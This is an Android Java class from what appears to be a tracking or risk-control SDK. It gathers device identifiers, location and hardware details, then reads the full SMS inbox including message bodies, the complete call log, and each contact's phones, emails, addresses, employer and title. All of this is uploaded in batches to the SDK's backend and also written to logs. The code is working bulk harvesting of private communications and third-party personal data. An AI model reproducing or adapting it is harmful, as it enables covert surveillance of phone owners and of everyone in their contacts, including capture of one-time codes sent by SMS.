package com.xwjr.track;


import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.text.TextUtils;
import android.util.Log;

import com.google.gson.Gson;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static com.xwjr.track.TrackConfig.context;

public class TrackData {

    public static Map<String, String> getCommonMap() {
        Map<String, String> map = new HashMap<>();
        try {
            if (!TextUtils.isEmpty(TrackLocalData.getUserId())) {
                map.put("uid", TrackLocalData.getUserId());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("latitude", TrackConfig.latitude);
            map.put("longitude", TrackConfig.longitude);
            map.put("address", TrackConfig.address);
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("appKey", TrackConfig.trackApphubkey);
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("timestamp", String.valueOf(System.currentTimeMillis()));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("currentVersionName", AndroidUtil.getVersionName(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("platform", "Android");
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("deviceUUID", AndroidUtil.getAndroidID());
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("deviceID", AndroidUtil.getDeviceId());
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("macAddress", AndroidUtil.getMacAddress(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            map.put("systemNetWork", AndroidUtil.getNetworkState(context));
            map.put("systemBattery", TrackConfig.battery);
//            map.put("systemInfoId", Build.ID);
            map.put("systemInfoBrand", Build.BRAND);
//            map.put("systemInfoModel", Build.MODEL);
            map.put("systemInfoRelease", Build.VERSION.RELEASE);
//            map.put("systemInfoSdk", Build.VERSION.SDK);
            map.put("systemInfoBoard", Build.BOARD);
            map.put("systemInfoProduct", Build.PRODUCT);
//            map.put("systemInfoDevice", Build.DEVICE);
            map.put("systemInfoFingerprint", Build.FINGERPRINT);
//            map.put("systemInfoHost", Build.HOST);
//            map.put("systemInfoTags", Build.TAGS);
//            map.put("systemInfoType", Build.TYPE);
//            map.put("systemInfoTime", String.valueOf(Build.TIME));
//            map.put("systemInfoIncremental", Build.VERSION.INCREMENTAL);
//            map.put("systemInfoDisplay", Build.DISPLAY);
            map.put("systemInfoSdkInt", String.valueOf(Build.VERSION.SDK_INT));
//            map.put("systemInfoManufacturer", Build.MANUFACTURER);
//            map.put("systemInfoBootLoader", Build.BOOTLOADER);
            map.put("systemInfoCpuAbi", Build.CPU_ABI);
//            map.put("systemInfoCpuAbi2", Build.CPU_ABI2);
            map.put("systemInfoHardware", Build.HARDWARE);
//            map.put("systemInfoUnKnow", Build.UNKNOWN);
//            map.put("systemInfoCodeName", Build.VERSION.CODENAME);
            map.put("systemInfoSerial", Build.SERIAL);
        } catch (Exception e) {
            e.printStackTrace();
        }


        return map;
    }

    //获取短信内容
    public static List<Map<String, String>> getSMSData(String mobile) {

        List<Map<String, String>> mapList = new ArrayList<>();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            LogUtils.i("无读取短信权限");
            return mapList;
        }

        try {
            Uri SMS_INBOX = Uri.parse("content://sms/");
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{"_id", "thread_id", "address", "protocol",
                    "read", "status", "service_center",
                    "person", "body", "date", "type"};
            Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
            if (null == cur) {
                LogUtils.i("短信内容 == null");
                return mapList;
            }
            while (cur.moveToNext()) {
                String _id = cur.getString(cur.getColumnIndex("_id"));//手机号
                String thread_id = cur.getString(cur.getColumnIndex("thread_id"));//手机号
                String address = cur.getString(cur.getColumnIndex("address"));//手机号
                String protocol = cur.getString(cur.getColumnIndex("protocol"));//手机号
                String read = cur.getString(cur.getColumnIndex("read"));//手机号
                String status = cur.getString(cur.getColumnIndex("status"));//手机号
                String service_center = cur.getString(cur.getColumnIndex("service_center"));//手机号
                String person = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
                String body = cur.getString(cur.getColumnIndex("body"));//短信内容
                String date = cur.getString(cur.getColumnIndex("date"));//短信内容
                String type = cur.getString(cur.getColumnIndex("type"));//短信内容

                LogUtils.i("_id:" + _id + "  thread_id:" + thread_id + "  address:" + address
                        + "  protocol:" + protocol + "  read:" + read + "  status:" + status + "  service_center:" + service_center
                        + "  person:" + person + "  body:" + body + "  date:" + date + "  type:" + type);

                Map<String, String> data = getCommonMap();
                data.put("id", "20001");
                data.put("type", "SMS");
                data.put("sms_id", _id);
                data.put("sms_thread_id", thread_id);
                data.put("sms_address", address);
                data.put("sms_protocol", protocol);
                data.put("sms_read", read);
                data.put("sms_status", status);
                data.put("sms_service_center", service_center);
                data.put("sms_person", person);
                data.put("sms_body", body);
                data.put("sms_date", date);
                data.put("sms_type", type);
                data.put("mobile", mobile);
                mapList.add(data);

                if (mapList.size() >= TrackConfig.singleDataLimit) {
                    TrackOperate.upload(mapList);
                    mapList.clear();
                }
            }
            cur.close();
            return mapList;
        } catch (Exception e) {
            e.printStackTrace();
            return mapList;
        }
    }

    //获取短信内容
    public static List<Map<String, String>> getFKSMSData(String mobile) {

        List<Map<String, String>> mapList = new ArrayList<>();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            LogUtils.i("无读取短信权限");
            return mapList;
        }

        try {
            Uri SMS_INBOX = Uri.parse("content://sms/");
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{"_id", "thread_id", "address", "protocol",
                    "read", "status", "service_center",
                    "person", "body", "date", "type"};
            Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
            if (null == cur) {
                LogUtils.i("短信内容 == null");
                return mapList;
            }
            while (cur.moveToNext()) {
                String _id = cur.getString(cur.getColumnIndex("_id"));//手机号
                String thread_id = cur.getString(cur.getColumnIndex("thread_id"));//手机号
                String address = cur.getString(cur.getColumnIndex("address"));//手机号
                String protocol = cur.getString(cur.getColumnIndex("protocol"));//手机号
                String read = cur.getString(cur.getColumnIndex("read"));//手机号
                String status = cur.getString(cur.getColumnIndex("status"));//手机号
                String service_center = cur.getString(cur.getColumnIndex("service_center"));//手机号
                String person = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
                String body = cur.getString(cur.getColumnIndex("body"));//短信内容
                String date = cur.getString(cur.getColumnIndex("date"));//短信内容
                String type = cur.getString(cur.getColumnIndex("type"));//短信内容

                LogUtils.i("_id:" + _id + "  thread_id:" + thread_id + "  address:" + address
                        + "  protocol:" + protocol + "  read:" + read + "  status:" + status + "  service_center:" + service_center
                        + "  person:" + person + "  body:" + body + "  date:" + date + "  type:" + type);

                Map<String, String> data = new HashMap<>();
//                data.put("id", "20001");
//                data.put("type", "SMS");
                data.put("smsId", _id);
                data.put("smsThreadId", thread_id);
                data.put("smsAddress", address);
                data.put("smsProtocol", protocol);
                data.put("smsRead", read);
                data.put("smsStatus", status);
                data.put("smsServiceCenter", service_center);
                data.put("smsPerson", person);
                data.put("smsBody", body);
                data.put("smsDate", formatDate(date));
                data.put("smsType", type);
                data.put("userMobile", mobile);
                mapList.add(data);
                if (mapList.size() >= TrackConfig.singleFKDataLimit) {
                    JSONObject object = new JSONObject();
                    object.put("type", "SMS");
                    object.put("payload", TrackData.mapList2String(mapList));
                    TrackOperate.uploadFKData(object.toString());
                    mapList.clear();
                }
            }
            cur.close();
            return mapList;
        } catch (Exception e) {
            e.printStackTrace();
            return mapList;
        }
    }


    //获取通话记录内容
    public static List<Map<String, String>> getCallData(String mobile) {

        List<Map<String, String>> mapList = new ArrayList<>();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            LogUtils.i("无读取通话记录权限");
            return mapList;
        }

        try {
            Uri uri = Uri.parse("content://call_log/calls");
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{
                    "number",
                    "date",
                    "type",
                    "duration",
                    "name",
            };
            Cursor cur = cr.query(uri, projection, null, null, "date desc");
            if (null == cur) {
                LogUtils.i("通话记录 == null");
                return mapList;
            }
            while (cur.moveToNext()) {
                String number = cur.getString(cur.getColumnIndex("number"));//手机号
                String date = cur.getString(cur.getColumnIndex("date"));//手机号
                String type = cur.getString(cur.getColumnIndex("type"));//手机号
                String duration = cur.getString(cur.getColumnIndex("duration"));//手机号
                String name = cur.getString(cur.getColumnIndex("name"));//手机号

                LogUtils.i("number:" + number + "  date:" + date + "  type:" + type
                        + "  duration:" + duration + "  name:" + name);

                Map<String, String> data = getCommonMap();
                data.put("id", "20003");
                data.put("type", "CALL_RECORDS");
                data.put("call_number", number);
                data.put("call_duration", duration);
                data.put("call_name", name);
                data.put("call_date", date);
                data.put("call_type", type);
                data.put("mobile", mobile);
                mapList.add(data);
                if (mapList.size() >= TrackConfig.singleDataLimit) {
                    TrackOperate.upload(mapList);
                    mapList.clear();
                }
            }
            cur.close();
            return mapList;
        } catch (Exception e) {
            e.printStackTrace();
            return mapList;
        }
    }


    //获取通话记录内容
    public static List<Map<String, String>> getFKCallData(String mobile) {

        List<Map<String, String>> mapList = new ArrayList<>();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            LogUtils.i("无读取通话记录权限");
            return mapList;
        }

        try {
            Uri uri = Uri.parse("content://call_log/calls");
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{
                    "number",
                    "date",
                    "type",
                    "duration",
                    "name",
            };
            Cursor cur = cr.query(uri, projection, null, null, "date desc");
            if (null == cur) {
                LogUtils.i("通话记录 == null");
                return mapList;
            }
            while (cur.moveToNext()) {
                String number = cur.getString(cur.getColumnIndex("number"));//手机号
                String date = cur.getString(cur.getColumnIndex("date"));//手机号
                String type = cur.getString(cur.getColumnIndex("type"));//手机号
                String typeDescription = "";
                switch (type) {
                    case "1":
                        typeDescription = "呼入";
                        break;
                    case "2":
                        typeDescription = "呼出";
                        break;
                    case "3":
                        typeDescription = "未接";
                        break;
                }
                String duration = cur.getString(cur.getColumnIndex("duration"));//手机号
                String name = cur.getString(cur.getColumnIndex("name"));//手机号

                LogUtils.i("number:" + number + "  date:" + date + "  type:" + type + "typeDescription:" + typeDescription
                        + "  duration:" + duration + "  name:" + name);

                Map<String, String> data = new HashMap<>();
//                data.put("id", "20003");
//                data.put("type", "CALL_RECORDS");
                data.put("callNumber", number);
                data.put("callDuration", duration);
                data.put("callName", name);
                data.put("callDate", formatDate(date));
                data.put("callType", type);
                data.put("typeDescription", typeDescription);
                data.put("userMobile", mobile);
                mapList.add(data);

                if (mapList.size() >= TrackConfig.singleFKDataLimit) {
                    JSONObject object = new JSONObject();
                    object.put("type", "CALLRECORDS");
                    object.put("payload", TrackData.mapList2String(mapList));
                    TrackOperate.uploadFKData(object.toString());
                    mapList.clear();
                }
            }
            cur.close();
            return mapList;
        } catch (Exception e) {
            e.printStackTrace();
            return mapList;
        }
    }


    //获取联系人内容
    public static List<Map<String, String>> getContactData(String mobile) {

        List<Map<String, String>> mapList = new ArrayList<>();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            LogUtils.i("无读取联系人权限");
            return mapList;
        }

        try {
            ContentResolver cr = context.getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (null == cur) {
                LogUtils.i("联系人 == null");
                return mapList;
            }
            while (cur.moveToNext()) {
                Map<String, String> data = getCommonMap();
                //获取联系人的ID
                String contactId = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                //获取联系人的姓名
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                //查询电话类型的数据操作
                Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId,
                        null, null);
                int phone = 0;
                while (phones != null && phones.moveToNext()) {
                    String phoneNumber = phones.getString(phones.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    //添加Phone的信息
                    data.put("contact_phone" + phone, phoneNumber);
                    phone++;
                }
                if (phones != null) {
                    phones.close();
                }

                //查询Email类型的数据操作
                Cursor emails = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = " + contactId,
                        null, null);
                int email = 0;
                while (emails != null && emails.moveToNext()) {
                    String emailAddress = emails.getString(emails.getColumnIndex(
                            ContactsContract.CommonDataKinds.Email.DATA));
                    //添加Email的信息
                    data.put("contact_email" + email, emailAddress);
                    email++;
                }
                if (emails != null) {
                    emails.close();
                }

                //查询==地址==类型的数据操作.StructuredPostal.TYPE_WORK
                Cursor address = cr.query(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID + " = " + contactId,
                        null, null);
                int add = 0;
                while (address != null && address.moveToNext()) {
                    String workAddress = address.getString(address.getColumnIndex(
                            ContactsContract.CommonDataKinds.StructuredPostal.DATA));


                    //添加Email的信息
                    data.put("contact_address" + add, workAddress);
                    add++;
                }
                if (address != null) {
                    address.close();
                }

                //查询==公司名字==类型的数据操作.Organization.COMPANY  ContactsContract.Data.CONTENT_URI
                String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                String[] orgWhereParams = new String[]{contactId,
                        ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
                        null, orgWhere, orgWhereParams, null);
                if (orgCur != null && orgCur.moveToFirst()) {
                    //组织名 (公司名字)
                    String company = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
                    //职位
                    String office = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                    data.put("contact_company", company);
                    data.put("contact_office", office);

                }
                if (orgCur != null) {
                    orgCur.close();
                }


                LogUtils.i("contactId:" + contactId + "  name:" + name);

                data.put("id", "20002");
                data.put("type", "CONTACTS");
                data.put("contact_contactId", contactId);
                data.put("contact_name", name);
                data.put("mobile", mobile);
                mapList.add(data);

                if (mapList.size() >= TrackConfig.singleDataLimit) {
                    TrackOperate.upload(mapList);
                    mapList.clear();
                }
            }
            cur.close();
            return mapList;
        } catch (Exception e) {
            e.printStackTrace();
            return mapList;
        }
    }

    //获取联系人内容
    public static List<Map<String, String>> getFKContactData(String mobile) {
        TrackLocalData.saveContactStatus("START");
        List<Map<String, String>> mapList = new ArrayList<>();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            LogUtils.i("无读取联系人权限");
            return mapList;
        }

        try {
            int curContactSize = 0;
            ContentResolver cr = context.getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (null == cur) {
                LogUtils.i("联系人 == null");
                return mapList;
            }
            while (cur.moveToNext()) {
                Map<String, String> data = new HashMap<>();
                //获取联系人的ID
                String contactId = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                //获取联系人的姓名
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                //查询电话类型的数据操作
                Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId,
                        null, null);
                int phone = 0;
                while (phones != null && phones.moveToNext()) {
                    String phoneNumber = phones.getString(phones.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    //添加Phone的信息
                    data.put("contactMobile" + phone, phoneNumber.replace(" ", ""));
                    phone++;
                }
                if (phones != null) {
                    phones.close();
                }

                //查询Email类型的数据操作
                Cursor emails = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = " + contactId,
                        null, null);
                int email = 0;
                while (emails != null && emails.moveToNext()) {
                    String emailAddress = emails.getString(emails.getColumnIndex(
                            ContactsContract.CommonDataKinds.Email.DATA));
                    //添加Email的信息
                    data.put("contactEmail" + email, emailAddress);
                    email++;
                }
                if (emails != null) {
                    emails.close();
                }

                //查询==地址==类型的数据操作.StructuredPostal.TYPE_WORK
                Cursor address = cr.query(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID + " = " + contactId,
                        null, null);
                int add = 0;
                while (address != null && address.moveToNext()) {
                    String workAddress = address.getString(address.getColumnIndex(
                            ContactsContract.CommonDataKinds.StructuredPostal.DATA));


                    //添加Email的信息
                    data.put("contactAddress" + add, workAddress);
                    add++;
                }
                if (address != null) {
                    address.close();
                }

                //查询==公司名字==类型的数据操作.Organization.COMPANY  ContactsContract.Data.CONTENT_URI
                String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                String[] orgWhereParams = new String[]{contactId,
                        ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
                        null, orgWhere, orgWhereParams, null);
                if (orgCur != null && orgCur.moveToFirst()) {
                    //组织名 (公司名字)
                    String company = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
                    //职位
                    String office = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                    data.put("contactCompany", company);
                    data.put("contactOffice", office);

                }
                if (orgCur != null) {
                    orgCur.close();
                }


//                data.put("id", "20002");
//                data.put("type", "CONTACTS");
                data.put("contactContactId", contactId);
                data.put("contactName", name);
                data.put("userMobile", mobile);

                LogUtils.i("contactId:" + contactId + "  data:" + new Gson().toJson(data));

                mapList.add(data);

                if (mapList.size() >= TrackConfig.singleFKDataLimit) {
                    JSONObject object = new JSONObject();
                    object.put("type", "CONTACTS");
                    object.put("payload", TrackData.mapList2String(mapList));
                    TrackOperate.uploadFKData(object.toString());
                    mapList.clear();
                }
                curContactSize++;
                TrackLocalData.saveContactStatus(String.valueOf(curContactSize));
            }
            cur.close();
            TrackLocalData.saveContactStatus("END");
            return mapList;
        } catch (Exception e) {
            e.printStackTrace();
            return mapList;
        }
    }

    public static String formatDate(String date) {
        Date callDate = new Date(Long.parseLong(date));
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        return sdf.format(callDate);
    }

    //将map转为json字符串
    public static String mapList2String(List<Map<String, String>> data) {
        return new Gson().toJson(data);
    }

}
